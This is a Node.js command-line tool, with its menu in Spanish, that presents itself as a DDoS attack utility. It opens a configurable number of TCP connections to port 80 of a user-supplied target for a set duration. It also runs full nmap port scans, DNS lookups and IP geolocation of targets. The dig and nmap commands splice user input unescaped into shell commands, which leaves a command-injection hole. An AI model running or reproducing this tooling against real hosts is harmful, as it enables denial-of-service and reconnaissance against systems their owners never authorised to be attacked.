const net = require('net');
const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

const colors = {
  reset: '[0m',
  bright: '[1m',
  dim: '[2m',
  underscore: '[4m',
  blink: '[5m',
  reverse: '[7m',
  hidden: '[8m',
  fg: {
    black: '[30m',
    red: '[31m',
    green: '[32m',
    yellow: '[33m',
    blue: '[34m',
    magenta: '[35m',
    cyan: '[36m',
    white: '[37m',
  },
  bg: {
    black: '[40m',
    red: '[41m',
    green: '[42m',
    yellow: '[43m',
    blue: '[44m',
    magenta: '[45m',
    cyan: '[46m',
    white: '[47m',
  }
};

const decorations = {
  underline: '[4m',
  bold: '[1m',
  italic: '[3m',
};

const async = require('async');
const axios = require('axios');
const geoip = require('geoip-lite');
const { exec } = require('child_process');

const showMenu = () => {
  console.clear();
  console.log('[31m[1m                DDoS attack   ');
  console.log('[36m[1m      ⭐️ Desarrollado por Keiji821');
  console.log('                ');
  console.log('[32m【1[32m】 [37m[1m Iniciar ataque DDoS');
  console.log('[32m【2[32m】 [37m[1m Actualizar código');
  console.log('[32m【3[32m】 [37m[1m Configurar conexiones simultanea');
  console.log('[32m【4[32m】 [37m[1m Aumentar potencia del ataque');
  console.log('[32m【5[32m】 [37m[1m Obtener información de DNS para una dirección IP');
  console.log('[32m【6[32m】 [37m[1m Análisis de IP');
  console.log('[32m【7[32m】 [37m[1m Información geográfica de IP');
  console.log('               ');
  console.log('[32m【8[32m】❌️ [31m[1m Salir');
  console.log('               ');
  rl.setPrompt('[37m[1m  🌐➤ ');
  rl.prompt();
};

let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`[36m[1m Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`[36m[1m Conectado a ${url}`);
});
socket.on('data', (data) => {
console.log(`[33m[1m Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('[32m[1m Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`[36m[1m Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`[32m[1m Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};


const getInfo = async (ip) => {
try {
const command = `dig +nocmd ${ip} any +multiline`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
const details = [];
for (const line of lines) {
if (line.includes(';; ANSWER SECTION:')) {
details.push('** ANSWER SECTION **');
} else if (line.includes(';')) {
const [key, value] = line.split(';');
details.push(`  ${key.trim()}: ${value.trim()}`);
} else {
const parts = line.split(/\s+/);
const recordType = parts[3];
const ttl = parts[1];
const value = parts[4];
switch (recordType) {
case 'A':
details.push(`  IP Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'AAAA':
details.push(`  IPv6 Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'NS':
details.push(`  Name Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'MX':
details.push(`  Mail Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'SOA':
details.push(`  Start of Authority: ${value} (TTL: ${ttl} seconds)`);
break;
default:
details.push(`  Unknown Record Type: ${recordType} (TTL: ${ttl} seconds)`);
}
}
}
console.log(` DNS Information for ${ip}:`);
console.log(`---------------------------`);
console.log(details.join(String.raw`
`));
console.log(`---------------------------`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const analyzeIP = async (ip) => {
try {
const command = `nmap -sT -p- ${ip}`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
let openPorts = [];
let filteredPorts = [];
let closedPorts = [];
for (const line of lines) {
if (line.includes('open')) {
const port = line.split(' ')[0];
openPorts.push(port);
} else if (line.includes('filtered')) {
const port = line.split(' ')[0];
filteredPorts.push(port);
} else if (line.includes('closed')) {
const port = line.split(' ')[0];
closedPorts.push(port);
}
}
if (openPorts.length > 0) {
console.log(` Puertos abiertos: ${openPorts.join(', ')}`);
}
if (filteredPorts.length > 0) {
console.log(` Puertos filtrados: ${filteredPorts.join(', ')}`);
}
if (closedPorts.length > 0) {
console.log(` Puertos cerrados: ${closedPorts.join(', ')}`);
}
if (openPorts.length === 0 && filteredPorts.length === 0 && closedPorts.length === 0) {
console.log(`[36m[1m No hay resultados`);
}
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};



const getGeoIP = async (ip) => {
try {
const response = await axios.get(`http://ip-api.com/json/${ip}`);
const data = response.data;
console.log(` `);
console.log(`[32m[1m 
 ╭─────────────────────────╮
 │ 🌕 Informacion de la IP │
 ╰─────────────────────────╯`);
console.log(`[32m[1m       〔[36m01[32m〕  [31m[1m País: [36m ${data.country}`);
console.log(`[32m[1m       〔[36m02[32m〕  [31m[1m Código del país: [36m ${data.countryCode}`);
console.log(`[32m[1m       〔[36m03[32m〕  [31m[1m Región: [36m ${data.region}`);
console.log(`[32m[1m       〔[36m04[32m〕  [31m[1m Código de la región: [36m ${data.regionCode}`);
console.log(`[32m[1m       〔[36m05[32m〕  [31m[1m Ciudad: [36m ${data.city}`);
console.log(`[32m[1m       〔[36m06[32m〕  [31m[1m Latitude: [36m ${data.lat}`);
console.log(`[32m[1m       〔[36m07[32m〕  [31m[1m Longitude: [36m ${data.lon}`);
console.log(`[32m[1m       〔[36m08[32m〕  [31m[1m ISP: [36m ${data.isp}`);
console.log(`[32m[1m       〔[36m09[32m〕  [31m[1m Empresa: [36m ${data.org}`);
console.log(`[32m[1m       〔[36m10[32m〕  [31m[1m  Zona horaria: [36m ${data.timezone}`);
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('[36m[1m Ingrese la URL del objetivo');
rl.question('[32m[1m URL: ', (url) => {
if (url === '') {
console.log('[33m[1m URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '2':
updateCode();
showMenu(); // Volver a mostrar el menú principal
break;
case '3':
console.log('[36m[1m Ingrese el número de conexiones simultaneas');
rl.question('[32m[1m Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('[31m[1m Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`[36m[1m Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '4':
console.log('[36m[1m Ingrese la duración del ataque (en segundos):>');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('[31m[1m Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`[36m[1m Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '5':
console.log('[36m[1m Ingrese la IP para obtener información');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[36m[1m IP invalida');
showMenu();
} else {
getInfo(ip);
showMenu();
}
});
break;
case '6':
console.log('[36m[1m Ingrese la IP para análisis ');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[31m[1m IP invalida');
showMenu();
} else {
analyzeIP(ip);
showMenu();
}
});
break;
case '7':
console.log('[36m[1m Ingrese la IP para obtener información geográfica');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[31m[1m IP invalida');
showMenu();
} else {
getGeoIP(ip);
showMenu();
}
});
break;
case '8':
console.log('[32m[1m Saliendo...');
process.exit();
break;
default:
console.log('[31m[1m Opción invalida');
showMenu();
}
}).on('close', () => {
process.exit();
});
